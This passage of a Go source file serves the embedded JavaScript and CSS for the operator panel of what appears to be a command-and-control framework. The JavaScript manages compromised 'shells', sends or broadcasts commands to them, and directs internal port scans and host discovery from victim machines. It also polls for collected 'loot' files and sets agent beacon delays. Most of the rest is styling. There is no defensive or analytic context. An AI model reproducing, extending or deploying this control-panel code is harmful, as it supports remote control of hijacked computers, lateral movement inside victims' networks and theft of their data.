                fetch(this.server + "/user_index?op=delInfo&uid=" + shell)
                    .then(response => response.text())
                    .then(data => {
                        alert(data);
                        this.User_data = this.User_data.filter(user => user.uid !== shell);
                        const userDiv = document.getElementById(shell + "info");
                        if (userDiv) {
                            userDiv.remove();  // 删除对应的 div 元素
                        }
                    })
                    .catch(error => console.error("Error:", error));
            }
        }
        
    getAll(os,cmd){
        if(os!="" && cmd!=""){
            if(cmd.startsWith("scan")){
                let target = cmd.split(" ")[1];
                var powershell = "getHisports^"+target;
            }else if(cmd.startsWith("sniff")){
                let target = cmd.split(" ")[1];
                var powershell = "getUfriends^"+target;
            }else{
                var powershell = cmd;
            }
            fetch(this.server+"/user_index?op=AllMsg&username="+this.username+"&osType="+os+"&msg="+encodeURIComponent(powershell))
            }
    }
    remarks(shell){
        let remark = prompt("input memo");
        if(remark){
            fetch(this.server+"/user_index?op=remarks&uid="+shell+"&username="+this.username+"&remarks="+remark)
        }
    }
    rate(shell){
        var time = prompt("delay");
        if(time){
            var powershell = "getTime^";
            fetch(this.server+"/user_index?op=getTime&uid="+shell+"&time="+time)
            .then(response => response.text())
            .then(data => {
                fetch(this.server+"/user_index?op=msg&uid="+shell+"&msg="+encodeURIComponent(powershell))
            })
        }
    }
    async getloot() {
        const lootFileDiv = document.getElementById('g_file');
        // 每隔 5 秒自动发送请求
        setInterval(async () => {
            try {
                let response = await fetch(this.server+"/user_index?op=getFile&username=" + this.username);
                if (!response.ok) {
                    throw new Error("Failed to fetch loot");
                }
                let lootHTML = await response.text();
                lootFileDiv.innerHTML = lootHTML;  // 更新页面内容
            } catch (error) {
                console.error("Error fetching loot:", error);
            }
        }, 5000);  // 5000 毫秒 = 5 秒
    }
    
}
class lain_net{
    constructor(){
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.shell_list=[];
    }
    
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    
    async getNet() {
        // 定时发送请求
        try {
            setInterval(async () => {
                var uid = document.getElementById('net_shell').value;
                if (uid) {
                    await fetch(this.server + "/user_index?op=net_getresults&uid=" + uid);
                    let net_json = await fetch(this.server + "/user_index?op=getInnet&uid=" + uid);
                    let text = await net_json.text();
                    console.log("Response Text:", text);
                    let net_data;
                    try {
                        net_data = JSON.parse(text);
                    } catch (e) {
                        console.error("Failed to parse JSON:", e);
                        return;
                    }
                    let net = document.getElementById('net_div');
                    net.innerHTML = ''; 
                    net_data.forEach(item => {
                        let div = document.createElement('div');
                        div.classList.add("net_div_son");
                        div.style.display = 'flex'; 
                        div.style.justifyContent = 'space-between';
                        let contentDiv = document.createElement('div');
                        contentDiv.innerHTML = "<strong></strong>" + item.target + "<br>";
                        // 添加空值检查和数组类型检查
                        if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
                            let innetDiv = document.createElement('div');
                            innetDiv.innerHTML = "<strong>Port:</strong>" + item.shell_innet.join(', ');
                            contentDiv.appendChild(innetDiv);
                        }
                        div.appendChild(contentDiv);
                        let button = document.createElement('button');
                        button.onclick = () => this.del_net(item.target, uid);
                        button.textContent = 'remove';
                        button.style.marginLeft = 'auto';
                        div.appendChild(button);
                        net.appendChild(div);
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Error in getNet:', error);
        }
    }
    
    
    async scan(){
        var uid = document.getElementById('net_shell').value;
        let optionValue = document.getElementById('net_options').value; //选项
        let targetValue = document.getElementById('net_target').value; //目标
        let targetListValue = document.getElementById('net_target_list').value; //探测范围
        var sleepTimeValue = document.getElementById('net_sleep_time').value; //休眠时间
        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //自定义时间
        if (sleepTimeValue === 'custom') {
            sleepTimeValue = customSleepTimeValue;
        }
        console.log('Select:', optionValue);
        console.log('IP:', targetValue);
        console.log('Range:', targetListValue);
        console.log('Delay:', sleepTimeValue);
        
        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
            sleepTimeValue = 1; // 默认最小值为1
        }

        if(optionValue === "scan"){
            var cmd="getHisports^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }else if(optionValue === "sniff"){
            var cmd="getUfriends^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }
        await fetch(this.server+"/user_index?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd));
    }
    del_net(target,uid){
        fetch(this.server+"/user_index?op=delShellInnet&uid="+uid+"&target="+target)
    }
    async getshellip(){
        var uid = document.getElementById('net_shell').value;
        let shell_ip_json = await fetch(this.server+"/user_index?op=getShellInnet&uid="+uid);
        let shell_ip_str = await shell_ip_json.text();  // 获取到的依然是字符串
        let shell_ip_list = shell_ip_str.split(',');  // 将逗号分隔的字符串转换为数组
        let have_ip_div = document.getElementById('have_ip');
        have_ip_div.innerHTML="";
        let cur_div = document.createElement('div');
        cur_div.textContent='Host net:';
        have_ip_div.appendChild(cur_div);
        shell_ip_list.forEach(item => {
            let div = document.createElement('div');
            div.innerHTML = "IP:"+item+"\t";  // 将每个IP显示在新的行中
            have_ip_div.appendChild(div);
        });
    }
}
function net_init(shell_list) {
    try {
        const selectElement = document.getElementById('net_shell');
        selectElement.innerHTML = '<option value="">Select</option>';
        shell_list.forEach(item => {
            const option = document.createElement('option');
            option.value = item.uid; // UID
            option.textContent = item.host; // Host, 或者你想展示的其它信息
            selectElement.appendChild(option);
        });
    } catch (error) {
        console.error("error:", error);
    }
}
function toggleInfo(uid,op) {
    console.log(uid,op)
    if(op == "info"){
        var infoContent = document.getElementById(uid+"-info-content");
    }else if(op == "choose"){
        var infoContent = document.getElementById(uid+"-choose-content");
    }
    infoContent.classList.toggle("show");
}

// 打开 iframe
function openIframe(url) {
    var iframePanel = document.getElementById('iframePanel');
    var iframe = document.getElementById('iframe');
    iframe.src = url;
    iframePanel.style.display = 'block';
}

// 关闭 iframe
function closeIframe() {
    var iframePanel = document.getElementById('iframePanel');
    iframePanel.style.display = 'none';
}

function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const log = document.getElementById('log');
    const content = document.querySelector('.content');
    const toggleButton = document.querySelector('.toggle-button');1
    // 切换 sidebar 和 log 的隐藏状态
    sidebar.classList.toggle('hidden');
    log.classList.toggle('hidden');
    // 切换 content 的全屏状态
    content.classList.toggle('fullscreen');
}

// 窗口调整大小
document.addEventListener('DOMContentLoaded', function() {
    var logDiv = document.getElementById('log');
    var handle = logDiv.querySelector('.resize-handle');
    var startY, startHeight;
    var isResizing = false;

    function mouseMoveHandler(e) {
        if (!isResizing) return;
        var heightChange = startY - e.clientY;
        var newHeight = startHeight + heightChange;
        logDiv.style.height = Math.max(20, newHeight) + 'px';
    }

    function mouseUpHandler() {
        isResizing = false;
        document.removeEventListener('mousemove', mouseMoveHandler);
        document.removeEventListener('mouseup', mouseUpHandler);
    }

    handle.addEventListener('mousedown', function(e) {
        e.preventDefault();
        startY = e.clientY;
        startHeight = parseInt(window.getComputedStyle(logDiv).height, 10);
        isResizing = true;
        document.addEventListener('mousemove', mouseMoveHandler);
        document.addEventListener('mouseup', mouseUpHandler);
    });

    setInterval(function() {
        let server = window.location.protocol + "//" + window.location.host;
        let url = server+"/user_index?op=logRead";
        fetch(url)
            .then(response => response.text())
            .then(data => {
                document.getElementById('log-content').innerText = data;
            });
    }, 1000);
    // iframe 拖动功能
const iframePanel = document.getElementById('iframePanel');
const dragHandle = iframePanel.querySelector('.drag-handle');
let isDragging = false;
let offsetX, offsetY;
dragHandle.addEventListener('mousedown', (e) => {
    isDragging = true;
    offsetX = e.clientX - iframePanel.offsetLeft;
    offsetY = e.clientY - iframePanel.offsetTop;
    document.addEventListener('mousemove', onMouseMove);
    document.addEventListener('mouseup', onMouseUp);
});

function onMouseMove(e) {
    if (isDragging) {
        let newX = e.clientX - offsetX;
        let newY = e.clientY - offsetY;
        const pageWidth = window.innerWidth;
        const pageHeight = window.innerHeight;
        const panelWidth = iframePanel.offsetWidth;
        const panelHeight = iframePanel.offsetHeight;
        if (newX < 0) newX = 0;
        else if (newX + panelWidth > pageWidth) newX = pageWidth - panelWidth;
        if (newY < 0) newY = 0;
        else if (newY + panelHeight > pageHeight) newY = pageHeight - panelHeight;
        // 更新 iframePanel 的位置
        iframePanel.style.left = newX + "px";
        iframePanel.style.top = newY + "px"; // 修正这里：应该是 newY
    }
}

function onMouseUp() {
    isDragging = false;
    document.removeEventListener('mousemove', onMouseMove);
    document.removeEventListener('mouseup', onMouseUp);
}


    // 侧边栏导航
    const links = document.querySelectorAll('.sidebar a');
    const sections = document.querySelectorAll('.content > div');
    links.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            sections.forEach(section => {
                if (section.id === targetId) {
                    section.classList.remove('hidden');
                } else {
                    section.classList.add('hidden');
                }
            });
        });
    });
});`

			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprint(w, html)
			return
		}
	}
}

func lain_css(css_file string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet {
			var cssContent string
			if css_file != "" {
				content, err := ioutil.ReadFile(css_file)
				if err != nil {
					http.Error(w, error_str, http.StatusInternalServerError)
					return
				}
				cssContent = string(content)
			} else {
				cssContent = `html, body {
                    margin: 0;
                    height: 100%;
                    font-family: Arial, sans-serif;
                    display: flex;
                    flex-direction: column;
                }
                .container {
                    display: flex; /* 使用flexbox布局 */
                    width: 100vw; /* 父容器宽度为视口宽度 */
                    height: 100vh; /* 父容器高度为视口高度 */
                }
                .sidebar {
                    width: 180px;
                    background-color: #acdeff;
                    color: #fff;
                    height: 100%;
                    padding: 20px;
                    box-sizing: border-box;
                    box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
                    overflow-y: auto;
                    top: 0;
                    left: 0;
                    position: relative; /* 使 .toggle-button 相对这个父元素定位 */
                    overflow: visible;
                    border-radius: 10px; /* 添加圆角 */
                }
                .sidebar a {
                    color: #000;
                    text-decoration: none;
                    display: block;
                    margin: 10px 0;
                    padding: 10px;
                    border-radius: 4px;
                    transition: background-color 0.2s, transform 0.2s;
                }
                .sidebar a i {
                    margin-right: 23px; /* 调整这个值来增加或减少图标和文字之间的距离 */
                }
                .sidebar a:hover {
                    transform: translateX(5px);
                    background-color: #4ca4df;
                }
                .content {
                    flex: 1;
                    height: 100vh;
                    padding: 20px;
                    box-sizing: border-box;
                    overflow-y: auto;
                    position: relative; /* 使 .toggle-button 相对这个父元素定位 */
                }
                .content.fullscreen {
                    margin-left: 0; /* 当 sidebar 隐藏时，content 占满整个页面 */
                    width: 100%; /* 确保 content 占据整个屏幕宽度 */
                    height: 100%;
                }
                #log {
                    height: 200px;
                    background-color: #ffdfdf;
                    color: #00000;
                    font-size: 15px;
                    box-sizing: border-box;
                    overflow: auto; /* 允许滚动 */
                    display: flex;
                    flex-direction: column; /* 更改为上下分布 */
                    position: fixed; /* 固定位置 */
                    bottom: 0;
                    left: 180px; /* 侧边栏的宽度 */
                    width: 100%; /* 全宽减去侧边栏宽度 */
                    overflow-y: auto;
                    padding-left: 5px;
                    padding-right: 5px;
                    border-radius: 10px; /* 添加圆角 */
                }
                #log-content {
                    flex: 1; /* 占据剩余的高度 */
                    overflow-y: auto;
                    box-sizing: border-box;
                }
                /* 自定义滚动条样式 */
                #log-content::-webkit-scrollbar {
                    width: 8px; /* 滚动条宽度 */
                }
                
                #log-content::-webkit-scrollbar-track {
                    background: #f1f1f1; /* 滚动条轨道背景色 */
                }
                
                #log-content::-webkit-scrollbar-thumb {
                    background: #888; /* 滚动条滑块背景色 */
                    border-radius: 10%; /* 滑块圆角 */
                }
                
                #log-content::-webkit-scrollbar-thumb:hover {
                    background: #555; /* 滑块悬停时背景色 */
                }
                #log .resize-handle {
                    width: 100%;
                    height: 10px;
                    top: 0px;
                    background-color: transparent;
                    position: sticky; /* 固定 handle 在 log 容器的底部 */
                    bottom: 0;
                    z-index: 10;
                    cursor: ns-resize;
                }
                .hidden {
                    display: none;
                }
                .toggle-button {
                    top: 10px;
                    width: 40px;
                    height: 40px;
                    position: absolute; /* 相对于 .sidebar 定位 */
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    border-radius: 50%;
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                    font-size: 24px;
                    z-index: 1000;
                    background-color: #58afff; /* 设置统一的白色背景 */
                }
                .toggle-button::before {
                    content: '☰';
                    display: block;
                    text-align: center;
                    line-height: 40px;
                }
                .sidebar, .toggle-button {
                    transition: transform 0.3s ease-in-out;
                }
                .iframe-panel {
                    position: absolute; /* 使用绝对定位 */
                    top: 100px; /* 初始位置 */
                    left: 100px; /* 初始位置 */
                    width: 60%;
                    height: 80%;
                    border: 1px solid #ccc;
                    background: #fff;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    z-index: 1000;
                    display: none; /* 默认隐藏 */
                }
                .iframe-panel .close-button {
                    position: absolute;
                    top: 5px;
                    right: 5px;
                }
                .iframe-panel .drag-handle {
                    width: 100%;
                    height: 30px; /* 固定高度 */
                    background-color: #f1f1f1;
                    cursor: move;
                    position: absolute;
                    top: 0;
                    left: 0;
                    z-index: 1005;
                }
                .iframe-panel iframe {
                    position: absolute;
                    top: 30px; /* 避开 drag-handle */
                    width: 100%;
                    height: calc(100% - 30px); /* 减去 drag-handle 的高度 */
                    border: none;
                }
                .close-button {
                    position: absolute;
                    top: 0px;
                    height: 23px;
                    right: 5px;
                    cursor: pointer;
                    background-color: #f00; /* 使用 background-color 代替 background */
                    color: #fff;
                    border: none;
                    padding: 5px 10px;
                    border-radius: 3px; /* 添加圆角 */
                    font-size: 14px; /* 设置字体大小 */
                    z-index: 1010; /* 确保 z-index 一致 */
                }
                .close-button:hover {
                    background-color: #d00; /* 添加悬停效果 */
                }
                /* 当 sidebar 隐藏时，按钮移动到页面的左上角 */
                .toggle-button.left {
                    left: 10px;
                }
                /* 新增隐藏状态时的样式 */
                .sidebar.hidden {
                    transform: translateX(-100%);
                }
                #log.hidden {
                    display: none; /* 隐藏log */
                }
                .content.fullscreen {
                    margin-left: 0;
                }
                /* 为移动设备设置 sidebar 的宽度 */
                @media (max-width: 768px) {
                    .sidebar {
                        width: 130px; /* 为移动端设置较窄的 sidebar */
                    }
                    #log {
                        left: 130px; /* 确保日志部分的左边距与 sidebar 匹配 */
                        width: calc(100% - 130px); /* 调整日志部分的宽度 */
                    }
                }
                .conn-container {
                    display: flex;
                    align-items: center;
                    justify-content: flex-start; /* 使子元素水平排列 */
                    border: 1px solid #ccc;
                    padding: 7px;
                    margin: 5px 0;
                    border-radius: 5px;
                    background-color: #f9f9f9;
                    width: 95%;
                    flex-wrap: wrap; /* 允许子元素换行 */
                }
                .conn-container > * {
                                    /* 确保子元素适应父容器宽度 */
                                    max-width: 100%;
                                    flex-shrink: 0; /* 防止子元素压缩 */
                                }
                .ip-container {
                    display: flex;
                    align-items: center;
                    border: 1px solid #ccc;
                    padding: 10px;
                    margin: 10px 0;
                    border-radius: 5px;
                    background-color: #f9f9f9;
                    max-width: 800px;
                }
                .os-container{ 
                    display: flex;
                    align-items: center;
                    padding: 10px;
                    margin-left: auto;
                    background-color: #f9f9f9;
                }
                .host-container{
                    white-space: nowrap; /* 防止内部元素换行 */
                }
                .ip-address, .online-time, .shell-address {
                    display: inline-block;
                    margin-right: 10px;
                    font-size: 1em;
                    font-weight: bold;
                }
                .let-it-in-button {
                    padding: 8px 12px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    background-color: #4CAF50;
                    color: white;
                    display: inline-block;
                    margin-right: 10px;
                }
                .button-container {
                    width: 40%;
                }
                .ip-info {
                    display: inline-block;
                    background: #fff;
                    padding: 10px;
                    width: 1000px;
                    margin: 10px;
                    margin-left: 50px;  /* 将元素推到右边 */
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    align-items: center;
                    border: none;
                }
                .info-content {
                    display: none;
                    margin-top: 10px;
                    padding: 10px;
                    background-color: #f0f0f0;
                    border-radius: 5px;
                }
                /* 让 info-content 内部的 p 标签变成 flex 布局，左右对齐 */
                .info-content p {
                    display: flex;
                    align-items: flex-start; /* 让左侧和右侧内容上对齐 */
                    gap: 10px; /* 左右内容间距 */
                    margin: 5px 0;
                }
                /* 统一左侧 strong 的样式 */
                .s_left {
                    font-size: 14px;
                    width: 120px; /* 设定统一宽度，保证左侧对齐 */
                    text-align: left;
                    flex-shrink: 0; /* 防止左侧文本被压缩 */
                    margin-right: 20px;
                }
                /* 右侧文本和输入框统一 */
                .s_right {
                    font-size: 14px;
                    text-align: left;
                    margin-left: 47px;
                    word-break: break-all; /* 让长内容自动换行 */
                }
                /* 右侧 input 统一样式 */
                input.s_right_input.custom-remarks {
                    font-size: 14px;
                    height: 20px; /* 设置固定高度，避免太高 */
                    line-height: 20px; /* 确保文字居中 */
                    text-align: left;
                    background-color: transparent;
                    border: none !important; /* 强制去掉边框 */
                    outline: none !important; /* 去掉聚焦时的默认高亮 */
                    box-shadow: none !important; /* 去掉可能的默认阴影 */
                    appearance: none; /* 禁用某些浏览器默认样式 */
                    -webkit-appearance: none; /* 兼容 Webkit 内核浏览器 */
                    -moz-appearance: none; /* 兼容 Firefox */
                    padding: 0; /* 避免额外的内边距撑高输入框 */
                }               
                input.s_right_input.custom-remarks:focu {
                    outline: none;
                    border: none;
                    box-shadow: none;
                    -webkit-tap-highlight-color: transparent; /* 禁止移动端高亮 */
                }                
                /* 显示时的样式 */
                .info-content.show {
                    display: block;
                }
                .choose-content {
                    display: none;
                    margin-top: 10px;
                    padding: 10px;
                    background-color: #f0f0f0;
                    border-radius: 5px;
                }
                .choose-content.show {
                    display: block;
                }
                @media (max-width: 768px) {
                    .s_left {
                        font-size: 12px; /* 调整左侧字体大小 */
                        width: auto; /* 宽度自适应 */
                        margin-right: 10px; /* 缩小右侧间距 */
                    }
                
                    .s_right {
                        font-size: 12px; /* 调整右侧文本大小 */
                        margin-left: 0; /* 去掉左侧间距 */
                    }
                
                    input.s_right_input.custom-remarks {
                        font-size: 12px; /* 调整输入框文字大小 */
                        height: 30px; /* 调整高度适应手机 */
                        line-height: 30px; /* 确保文字居中 */
                        padding-left: 5px; /* 添加左内边距 */
                    }
                
                    .info-content {
                        padding: 8px; /* 手机端调整内边距 */
                    }
                }
                
                /* 更小的手机端适配 */
                @media (max-width: 480px) {
                    .s_left {
                        font-size: 10px; /* 更小的字体 */
                    }
                
                    .s_right {
                        font-size: 10px; /* 更小的字体 */
                    }
                
                    input.s_right_input.custom-remarks {
                        font-size: 10px; /* 更小的字体 */
                        height: 28px; /* 调整高度 */
                        line-height: 28px; /* 确保文字居中 */
                    }
                }
                .ip-address, .action-button, .console-link {
                    margin-right: 3.5px; /* 元素之间的间隔 */
                    white-space: nowrap;  /*防止换行 */
                    border: none; /* 去掉边框 */
                }
                .ip-address, .action-button, .console-link {
                    margin-right: 3.5px; /* 元素之间的间隔 */
                    white-space: nowrap;  /*防止换行 */
                    border: none; /* 去掉边框 */
                }
                .ip-container {
                    font-size: 14px;
                    color: #007BFF;
                    margin: 18px;
                }
                .ip-address {
                    font-size: 12px;
                    color: #555;
                    margin-right: 8px;
                }
                .host-name { /* 主机名特殊样式 */
                    font-weight: bold; /* 加粗显示 */
                }
                .action-button {
                    padding: 5px 10px;
                    border-radius: 5px;
                    cursor: pointer;
                    justify-content: center;
                    gap: 25px; /* 按钮之间的间距 */
                    font-size: 12px;
                    background-color: #ccc; /* 浅灰色 */
                    color: #fff;
                    border: none; /* 去掉按钮边框 */
                    transition: background-color 0.3s; /* 平滑过渡效果 */
                }
                .action-button:hover {
                    background-color: #fff; /* 鼠标悬浮时背景变为白色 */
                    color: #333; /* 鼠标悬浮时文字颜色变为深色 */
                }
                .console-link {
                    justify-content: center;
                    gap: 25px; /* 按钮之间的间距 */
                    text-decoration: none; /* 去掉下划线 */
                    color: #007BFF; /* 设置链接颜色 */
                    font-size: 12px; /* 设置字体大小 */
                    margin-left: 5px; /* 设置与前一个元素的间隔 */
                    border: none; /* 去掉边框 */
                    padding: 8px 15px; /* 设置内边距 */
                    border-radius: 4px; /* 设置边框圆角 */
                    background-color: #f8f9fa; /* 设置背景颜色 */
                    transition: background-color 0.3s, color 0.3s; /* 平滑过渡效果 */
                    cursor: pointer; /* 鼠标悬停时显示手形图标 */
                    outline: none; /* 点击时不显示轮廓 */
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* 添加阴影效果 */
                }
                .console-link:hover,
                .console-link:focus {
                    background-color: #0069d9; /* 鼠标悬停或聚焦时的背景颜色 */
                    color: white; /* 文字颜色 */
                    text-decoration: none; /* 鼠标悬停时不显示下划线 */
                    }
                .console-link:active {
                    background-color: #0062cc; /* 鼠标按下时的背景颜色 */
                    box-shadow: none; /* 移除阴影 */
                }
                .external-address {
                    margin-left: 5px; /* 与前面的元素保持间隔 */
                    border: none; /* 去掉边框 */
                }
                .external-address .ip-address {
                    margin-left: 10px; /* 与前面的按钮保持间隔 */
                }
                .form {
                    background: #fff;
                    padding: 10px;
                    width: 100%;
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                    display: flex;
                    flex-direction: row; /* 横向排列 */
                    gap: 15px; /* 元素之间的间距 */
                    align-items: center; /* 元素垂直居中 */
                }
                input[type="text"] {
                    margin-left: 5%; 
                    width: 45%; /* 输入框宽度调整 */
                    padding: 10px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 14px;
                    transition: border-color 0.3s;
                }
                input[type="text"]:focus {
                    border-color: #007BFF;
                    outline: none;
                }
                label {
                    font-size: 14px;
                    color: #333;
                }
                select {
                    width: 25%; /* 下拉菜单宽度调整 */
                    padding: 10px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 14px;
                    background-color: #fff;
                    transition: border-color 0.3s;
                }
                select:focus {
                    border-color: #007BFF;
                    outline: none;
                }
                button {
                    padding: 10px 15px;
                    background-color: #007BFF;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 14px;
                    transition: background-color 0.3s;
                }
                button:hover {
                    background-color: #0056b3;
                }
                #div_index {
                    margin-top: 15px;
                }
                /* 为移动设备设置 sidebar 的宽度 */
                @media (max-width: 768px) {
                    .ip-container {
                        flex-direction: column; /* 垂直排列，避免元素拥挤 */
                        padding: 5px; /* 减少内边距 */
                    }
                    .ip-info {
                        max-width: 250px; /* 让 ip-info 在移动端填满整个屏幕 */
                        margin: 0;
                    }
                    .conn-container {
                        flex-direction: row; /* 确保子元素在一行内 */
                        flex-wrap: wrap; /* 允许换行 */
                        max-width: 100%; /* 防止超出 */
                        overflow: hidden; /* 避免溢出 */
                        background-color: #f9f9f9;
                    }
                    .os-container {
                        display: flex;
                        align-items: center;
                        padding: 10px;
                        background-color: #f9f9f9;
                        margin-left: 0; /* 取消自动推到右侧 */
                    }                    
                    .ip-address, .action-button, .console-link {
                        margin-right: 0; /* 移动端去掉右侧的间隔 */
                        margin-bottom: 10px; /* 元素之间增加垂直间隔 */
                        font-size: 14px; /* 调整字体大小 */
                    }
                    .action-button, .console-link {
                        width: 100%; /* 在移动设备上按钮占满整个行 */
                        text-align: center; /* 按钮内文字居中 */
                    }
                    .host-name, .ip-address {
                        font-size: 14px; /* 调整主机名和 IP 的字体大小 */
                    }
                    .let-it-in-button {
                        width: 100%; /* 按钮宽度 100% 占据一整行 */
                        margin-bottom: 10px;
                    }
                    .form {
                        background: #fff;
                        padding: 10px;
                        width: 100%;
                        border-radius: 8px;
                        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                        display: flex;
                        flex-direction: row; /* 横向排列 */
                        gap: 15px; /* 元素之间的间距 */
                        align-items: center; /* 元素垂直居中 */
                    }
                    .button-container {
                        width: 40%;
                    }
                }
                .net_div {
                    height: 20%;
                    background-color: lightgray; /* 添加背景色以便于查看 */
                }
                .net_scan{
                    display: flex;
                    gap: 10px; 
                    margin-bottom: 2%;
                }
                .net_div_son {
                    background-color: #f9f9f9; /* 浅灰色背景 */
                    border: 1px solid #ddd; /* 轻微的边框 */
                    border-radius: 5px; /* 圆角边框 */
                    box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* 轻微的阴影，增加层次感 */
                    padding: 15px; /* 内边距 */
                    margin-bottom: 10px; /* 与下一个元素的间距 */
                    transition: transform 0.3s ease, box-shadow 0.3s ease; /* 动态效果 */
                }
                .net_div_son:hover {
                    transform: translateY(-3px); /* 鼠标悬停时轻微上移 */
                    box-shadow: 0 4px 8px rgba(0,0,0,0.2); /* 鼠标悬停时更深的阴影 */
                }
                .net_div_son strong {
                    color: #333; /* 强调文字颜色 */
                    margin-right: 5px; /* 与内容的间距 */
                }
                .net_div_son hr {
                    border: 0; /* 移除边框 */
                    height: 1px; /* 高度 */
                    background-color: #eaeaea; /* 颜色 */
                    margin: 10px 0; /* 与内容的间距 */
                }
                .net_div_son button {
                    margin-left: auto; /* 按钮靠右 */
                    min-height: 60%;
                }
                #have_ip {
                    display: flex; /* 设置为flex布局 */
                    flex-wrap: wrap; /* 允许子元素自动换行 */
                    gap: 10px; /* 设置子元素之间的间距 */
                    margin-top: 10px; /* 与选择框的间距 */
                    font-family: 'Arial', sans-serif; /* 设置字体 */
                    margin-left: 15px;
                }
                #have_ip div {
                    background-color: #f0f0f0; /* 浅灰色背景 */
                    border: 1px solid #ddd; /* 边框颜色 */
                    border-radius: 4px; /* 圆角边框 */
                    padding: 5px 10px; /* 内边距 */
                    display: inline-block; /* 内联块级元素 */
                }
                #have_ip div:hover {
                    background-color: #e0e0e0; /* 鼠标悬停时的背景颜色 */
                    cursor: pointer; /* 鼠标悬停时的光标样式 */
                }
                .filecontainer {
                    max-width: 1200px;
                    margin: 20px auto;
                    padding: 20px;
                    background-color: white;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                }
                .file-manager {
                    display: flex;
                    flex-wrap: wrap;
                    justify-content: center;
                    gap: 10px;
                    margin-top: 20px;
                }
                .directory, .file {
                    display: flex;
                    align-items: center;
                    padding: 10px;
                    width: calc(50% - 10px);
                    background-color: white;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    cursor: pointer;
                    text-decoration: none;
                    color: inherit;
                    transition: box-shadow 0.3s, transform 0.3s;
                }
                .directory:hover, .file:hover {
                    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
                    transform: translateY(-2px);
                }
                .icon {
                    font-size: 1.5em;
                    margin-right: 10px;
                    color: #555;
                }
                .dir-btn {
                    padding: 10px 20px;
                    font-size: 1em;
                    color: #fff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s, transform 0.3s;
                    text-transform: uppercase;
                    letter-spacing: 0.05em;
                    margin-bottom: 1%;
                }
                .dir-btn:hover {
                    background-color: #0056b3;
                }
                .dir-btn:active {
                    background-color: #004085;
                    transform: translateY(2px);
                }
                #cur_dir {
                    background-color: #f9f9f9;
                    border: 1px solid #e1e4e8;
                    border-radius: 8px;
                    padding: 15px 20px;
                    margin: 20px 0;
                    font-size: 16px;
                }
                #cur_dir_p{
                    margin-right: 2%;
                }
                #uploadForm {
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    gap: 10px;
                }
                #uploadForm input[type="file"] {
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    cursor: pointer;
                }
                #uploadForm input[type="submit"] {
                    padding: 10px 20px;
                    font-size: 1em;
                    color: #fff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s;
                }
                #uploadForm input[type="submit"]:hover {
                    background-color: #0056b3;
                }
                #uploadForm input[type="submit"]:active {
                    background-color: #004085;
                    transform: translateY(2px);
                }
                .dir-controls {
                    display: flex;       /* 使用flex布局 */
                    align-items: center; /* 垂直居中对齐子元素 */
                    margin-top: 20px;   /* 根据需要调整上边距 */
                }
                    /* 输入框样式 */
                #directoryInput {
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    font-size: 16px;
                    margin-right: 10px; /* 与按钮保持间距 */
                    width: 200px; /* 设置一个合适的宽度 */
                    transition: border-color 0.3s, box-shadow 0.3s;
                }
                #directoryInput:focus {
                    border-color: #007bff;
                    box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
                    outline: none; /* 移除默认的焦点轮廓 */
                }
                /* 按钮样式 */
                #moveDirButton {
                    padding: 10px 20px;
                    font-size: 16px;
                    color: #fff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s, transform 0.3s;
                }
                #moveDirButton:hover {
                    background-color: #0056b3;
                }
                #moveDirButton:active {
                    background-color: #004085;
                    transform: translateY(2px);
                }
                /* 响应式设计 */
                @media (max-width: 768px) {
                    .directory, .file {
                        width: calc(100% - 10px);
                    }
                }
                
                
                .shell-container {
                    display: flex; /* 使用 flexbox 布局 */
                    align-items: center; /* 垂直居中对齐 */
                    top: 0;
                }
                .terminal {
                    width: 100%;
                    height: 100vh;
                    border: 1px solid rgb(242, 166, 254);
                    padding: 10px;
                    box-sizing: border-box;
                    overflow-y: auto;
                    background-color: #dfdfdf;
                    box-shadow: 0 0 10px rgb(202, 250, 172);
                }
                .shell-input {
                    width: calc(100% - 30px);
                    border: none;
                    background: transparent;
                    color: #000;
                    outline: none;
                    font-size: 16px;
